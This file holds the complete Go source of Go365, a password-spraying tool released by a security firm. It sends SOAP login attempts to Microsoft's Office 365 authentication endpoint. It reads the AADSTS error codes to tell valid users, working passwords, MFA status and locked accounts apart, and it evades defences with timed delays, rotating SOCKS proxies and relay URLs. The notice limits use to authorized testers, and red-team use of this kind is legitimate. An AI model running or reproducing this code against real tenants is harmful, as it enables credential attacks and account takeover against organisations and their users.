/*
Go365

authors: h0useh3ad, paveway3, S4R1N, EatonChips

license: MIT

Copyright 2020 Optiv Inc.
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
This tool is intended to be used by security professionals that are AUTHORIZED to test the domain targeted by this tool.

needs:
- Add a pre-test that enumerates the target domain and determines if it is a viable target for this particular endpoint.
- Error handling in a few areas.
	e.g... Setting up proxy (e.g. verify proxy server is up, handle timeouts, etc.)
*/

package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/beevik/etree"
	"github.com/fatih/color"
	"golang.org/x/net/proxy"
)

var (
	targetURL = "https://login.microsoftonline.com/rst2.srf" // keep an eye on this url.
	debug     = false
)

const (
	version = "0.2"
	tool    = "Go365"
	authors = "h0useh3ad, paveway3, S4R1N, EatonChips"
	usage   = ` Usage:
     ./Go365 -ul <userlist> -p <password> -d <domain> [OPTIONS]
 Options:
     -h,            Show this stuff

	 Required:
     -u string              Username to use
                              - Username with or without "@domain.com"
                              (-u legit.user)
     -ul <file>             Username list to use
                              - File should contain one username per line
                              - Usernames can have "@domain.com"
                              - If no domain is specified, the -d domain is used
                              (-ul ./usernamelist.txt)
     -p <string>            Password to attempt
                              - Enclose in single quotes if it contains special characters
                              (-p password123  OR  -p 'p@s$w0|2d')
     -pl <file>            Password list to use
                              - File should contain one password per line
                              - Must be used with -delay (delay)
                              (-pl ./passwordlist.txt)
     -up <file>            Userpass list to use
                              - One username and password separated by a ":" per line
                              - Be careful of duplicate usernames!
                              (-up ./userpasslist.txt)
    
   Optional:
     -d <string>            Domain to test
                              (-d testdomain.com)
	 -w <int>              Time to wait between attempts in seconds. 
                              - Default: 1 second. 5 seconds recommended.
                              (-w 10)
     -delay <int>          Delay (in seconds) between sprays when using a password list.
                              - Default: 10 minutes. 60 minutes (3600 seconds) recommended.
                              (-delay 600)
     -o <string>           Output file to write to
                              - Will append if file exists, otherwise a file is created
                              (-o ./output.out)
     -proxy <string>       Single proxy server to use
                              - IP address and Port separated by a ":"
                              - Has only been tested using SSH SOCKS5 proxies
                              (-proxy 127.0.0.1:1080)
     -proxyfile <string>    A file with a list of proxy servers to use
                              - IP address and Port separated by a ":" on each line
                              - Randomly selects a proxy server to use before each request
                              - Has only been tested using SSH SOCKS5 proxies
                              (-proxyfile ./proxyfile.txt)
     -url <string>          Endpoint to send requests to
                              - Amazon API Gateway 'Invoke URL'
                              (-url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login)
     -debug                 Debug mode.
                              - Print xml response

 Examples:
   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com
   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5
   ./Go365 -up ./userpass_list.txt -delay 3600 -d pwnthisfakedomain.com -w 5 -o Go365output.txt
   ./Go365 -u legituser -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxy 127.0.0.1:1080
   ./Go365 -u legituser -pl ./pass_list.txt -delay 1800 -d pwnthisfakedomain.com -w 5 -o Go365output.txt -proxyfile ./proxyfile.txt
   ./Go365 -ul ./user_list.txt -p 'coolpasswordbro!123' -d pwnthisfakedomain.com -w 5 -o Go365output.txt -url https://k62g98dne3.execute-api.us-east-2.amazonaws.com/login
`
	banner = `
  ██████         ██████   ██████  ██████
 ██                   ██ ██       ██     
 ██  ███   ████   █████  ███████  ██████
 ██    ██ ██  ██      ██ ██    ██      ██
  ██████   ████  ██████   ██████  ██████
`
)

func wait(wt int) {
	waitTime := time.Duration(wt) * time.Second
	time.Sleep(waitTime)
}

func randomProxy(proxies []string) string {
	var proxy string
	if len(proxies) > 0 {
		proxy = proxies[rand.Intn(len(proxies))]
	}
	return proxy
}

func doTheStuff(un string, pw string, prox string) (string, color.Attribute) {
	var returnString string
	var returnColor color.Attribute

	requestBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
	<S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust">
	    <S:Header>
	    <wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
	    <wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To>
	    <ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo">
	        <ps:BinaryVersion>5</ps:BinaryVersion>
	        <ps:HostingApp>Managed IDCRL</ps:HostingApp>
	    </ps:AuthInfo>
	    <wsse:Security>
	    <wsse:UsernameToken wsu:Id="user">
	        <wsse:Username>` + un + `</wsse:Username>
	        <wsse:Password>` + pw + `</wsse:Password>
	    </wsse:UsernameToken>
	</wsse:Security>
	    </S:Header>
	    <S:Body>
	    <wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0">
	        <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
	        <wsp:AppliesTo>
	        <wsa:EndpointReference>
	            <wsa:Address>online.lync.com</wsa:Address>
	        </wsa:EndpointReference>
	        </wsp:AppliesTo>
	        <wsp:PolicyReference URI="MBI"></wsp:PolicyReference>
	    </wst:RequestSecurityToken>
	    </S:Body>
	</S:Envelope>`)

	client := &http.Client{}

	// Set proxy if used
	if prox != "" {
		dialSOCKSProxy, err := proxy.SOCKS5("tcp", prox, nil, proxy.Direct)
		if err != nil {
			fmt.Println("Error connecting to proxy.")
		}
		tr := &http.Transport{Dial: dialSOCKSProxy.Dial}
		client = &http.Client{
			Transport: tr,
			Timeout:   15 * time.Second,
		}
	}

	// Build http request
	request, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(requestBody)))
	request.Header.Add("User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)")
	if err != nil {
		panic(err)
	}

	// Send http request
	response, err := client.Do(request)
	if err != nil {
		panic(err)
	}
	defer response.Body.Close()

	// Read response
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		print(err)
	}

	// Parse response
	xmlResponse := etree.NewDocument()
	xmlResponse.ReadFromBytes(body)

	// Read response codes
	x := xmlResponse.FindElement("//psf:text")
	if x == nil {
		returnString = color.GreenString("[+] Possible valid login! " + un + " : " + pw)
	} else if strings.Contains(x.Text(), "AADSTS50059") {
		fmt.Println(color.RedString("[-] Domain not found in o365 directory. Exiting..."))
		os.Exit(0) // no need to continue if the domain isn't found
	} else if strings.Contains(x.Text(), "AADSTS50034") {
		returnString = "[-] User not found: " + un
		returnColor = color.FgRed
	} else if strings.Contains(x.Text(), "AADSTS50126") {
		returnString = "[-] Valid user, but invalid password: " + un + " : " + pw
		returnColor = color.FgYellow
	} else if strings.Contains(x.Text(), "AADSTS50055") {
		returnString = "[!] Valid user, expired password: " + un + " : " + pw
		returnColor = color.FgMagenta
	} else if strings.Contains(x.Text(), "AADSTS50056") {
		returnString = "[!] User exists, but unable to determine if the password is correct: " + un + " : " + pw
		returnColor = color.FgYellow
	} else if strings.Contains(x.Text(), "AADSTS50053") {
		returnString = "[-] Account locked out: " + un
		returnColor = color.FgMagenta
	} else if strings.Contains(x.Text(), "AADSTS50057") {
		returnString = "[-] Account disabled: " + un
		returnColor = color.FgMagenta
	} else if strings.Contains(x.Text(), "AADSTS50076") || strings.Contains(x.Text(), "AADSTS50079") {
		returnString = "[+] Possible valid login, MFA required. " + un + " : " + pw
		returnColor = color.FgGreen
	} else if strings.Contains(x.Text(), "AADSTS53004") {
		returnString = "[+] Possible valid login, user must enroll in MFA. " + un + " : " + pw
		returnColor = color.FgGreen
	} else {
		returnString = "[!] Unknown response, run with -debug flag for more information. " + un + " : " + pw
		returnColor = color.FgMagenta
	}

	if debug {
		returnString = returnString + "\n" + x.Text() + "\n" + string(body)
	}

	return returnString, returnColor
}

type flagVars struct {
	flagHelp         bool
	flagUsername     string
	flagUsernameFile string
	flagDomain       string
	flagPassword     string
	flagPasswordFile string
	flagUserPassFile string
	flagDelay        int
	flagWaitTime     int
	flagProxy        string
	flagProxyFile    string
	flagOutFilePath  string
	flagTargetURL    string
	flagDebug        bool
}

func flagOptions() *flagVars {
	flagHelp := flag.Bool("h", false, "")
	flagUsername := flag.String("u", "", "")
	flagUsernameFile := flag.String("ul", "", "")
	flagDomain := flag.String("d", "", "")
	flagPassword := flag.String("p", "", "")
	flagPasswordFile := flag.String("pl", "", "")
	flagUserPassFile := flag.String("up", "", "")
	flagDelay := flag.Int("delay", 600, "")
	flagWaitTime := flag.Int("w", 1, "")
	flagProxy := flag.String("proxy", "", "")
	flagOutFilePath := flag.String("o", "", "")
	flagProxyFile := flag.String("proxyfile", "", "")
	flagTargetURL := flag.String("url", targetURL, "")
	flagDebug := flag.Bool("debug", false, "")

	flag.Parse()

	return &flagVars{
		flagHelp:         *flagHelp,
		flagUsername:     *flagUsername,
		flagUsernameFile: *flagUsernameFile,
		flagDomain:       *flagDomain,
		flagPassword:     *flagPassword,
		flagPasswordFile: *flagPasswordFile,
		flagUserPassFile: *flagUserPassFile,
		flagDelay:        *flagDelay,
		flagWaitTime:     *flagWaitTime,
		flagProxy:        *flagProxy,
		flagProxyFile:    *flagProxyFile,
		flagOutFilePath:  *flagOutFilePath,
		flagTargetURL:    *flagTargetURL,
		flagDebug:        *flagDebug,
	}
}

func main() {

	fmt.Println(color.BlueString(banner))
	fmt.Println(color.RedString(" Version: ") + version)
	fmt.Println(color.RedString(" Authors: ") + authors + "\n")
	fmt.Println(" This tool is currently in development.\n")

	var domain string
	var proxyList []string
	var usernameList []string
	var passwordList []string
	var outFile *os.File
	var err error

	rand.Seed(time.Now().UnixNano())
	opt := flagOptions()

	//-h
	if opt.flagHelp {
		fmt.Printf("%s\n", usage)
		os.Exit(0)
	}

	// -u
	if opt.flagUsername != "" {
		usernameList = append(usernameList, opt.flagUsername)
	} else if opt.flagUsernameFile == "" && opt.flagUserPassFile == "" {
		fmt.Printf("%s\n", usage)
		fmt.Println(color.RedString("Must provide a user. E.g. -u legituser, -ul ./user_list.txt, -up ./userpass_list.txt"))
		os.Exit(0)
	}

	// -ul
	if opt.flagUsernameFile != "" {
		// Open username file
		usernameFile, err := os.Open(opt.flagUsernameFile)
		if err != nil {
			panic(err)
		}
		defer usernameFile.Close()

		// Read username file
		scanner := bufio.NewScanner(usernameFile)
		for scanner.Scan() {
			usernameList = append(usernameList, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			panic(err)
		}
	}

	// -p
	if opt.flagPassword != "" {
		passwordList = append(passwordList, opt.flagPassword)
	} else if opt.flagPasswordFile == "" && opt.flagUserPassFile == "" {
		fmt.Printf("%s\n", usage)
		fmt.Println(color.RedString("Must provide a password to test. E.g. -p 'password123!', -pl ./password_list.txt, -up ./userpass_list.txt"))
		os.Exit(0)
	}

	// -pl
	if opt.flagPasswordFile != "" {
		// Open password file
		passwordFile, err := os.Open(opt.flagPasswordFile)
		if err != nil {
			panic(err)
		}
		defer passwordFile.Close()

		// Read password file
		scanner := bufio.NewScanner(passwordFile)
		for scanner.Scan() {
			passwordList = append(passwordList, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			panic(err)
		}
	}

	// -up
	if opt.flagUserPassFile != "" {
		// Open userpass file
		passwordFile, err := os.Open(opt.flagUserPassFile)
		if err != nil {
			panic(err)
		}
		defer passwordFile.Close()

		// Read userpass file
		scanner := bufio.NewScanner(passwordFile)
		for scanner.Scan() {
			up := strings.Split(scanner.Text(), ":")
			if len(up) > 1 {
				usernameList = append(usernameList, up[0])
				passwordList = append(passwordList, up[1])
			}
		}
		if err := scanner.Err(); err != nil {
			panic(err)
		}
	}

	// -d
	if opt.flagDomain != "" {
		domain = fmt.Sprintf("@" + opt.flagDomain)
	}

	// -proxy
	if opt.flagProxy != "" {
		proxyList = append(proxyList, opt.flagProxy)

		fmt.Println(color.GreenString("[!] Optional proxy configured: " + opt.flagProxy))
	}

	// -proxyfile
	if opt.flagProxyFile != "" {
		proxyFile, err := os.Open(opt.flagProxyFile)
		if err != nil {
			panic(err)
		}
		defer proxyFile.Close()

		scanner := bufio.NewScanner(proxyFile)
		for scanner.Scan() {
			proxyList = append(proxyList, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			panic(err)
		}

		fmt.Println(color.GreenString("[!] Optional proxy file configured: " + opt.flagProxyFile))
	}

	// -o
	if opt.flagOutFilePath != "" {
		outFile, err = os.OpenFile(opt.flagOutFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			panic(err)
		}
		defer outFile.Close()

		outFile.WriteString(strings.Join(os.Args, " ") + "\n")
	}

	// -url
	targetURL = opt.flagTargetURL

	// -debug
	debug = opt.flagDebug

	// Iterate through passwords
	for i, pass := range passwordList {
		// Iterate through usernames
		for j, user := range usernameList {
			// Add domain if username doesn't already have one
			if !strings.Contains(user, "@") {
				user = user + domain
			}

			// If using userpass file, use corresponding password
			if opt.flagUserPassFile != "" {
				pass = passwordList[j]
			}

			// Test username:password combo
			result, col := doTheStuff(user, pass, randomProxy(proxyList))

			// Print with color
			color.Set(col)
			fmt.Println(result)
			color.Unset()

			// Write to file
			if opt.flagOutFilePath != "" {
				outFile.WriteString(result + "\n")
			}

			// Wait between usernames
			if j < len(usernameList)-1 {
				wait(opt.flagWaitTime)
			}
		}

		// If using userpass file, exit loop
		if opt.flagUserPassFile != "" {
			break
		}

		// Wait between passwords
		if i < len(passwordList)-1 {
			wait(opt.flagDelay)
		}
	}

	// Remind user of output file
	if opt.flagOutFilePath != "" {
		fmt.Println(color.GreenString("[!] Output file located at: " + opt.flagOutFilePath))
	}
}
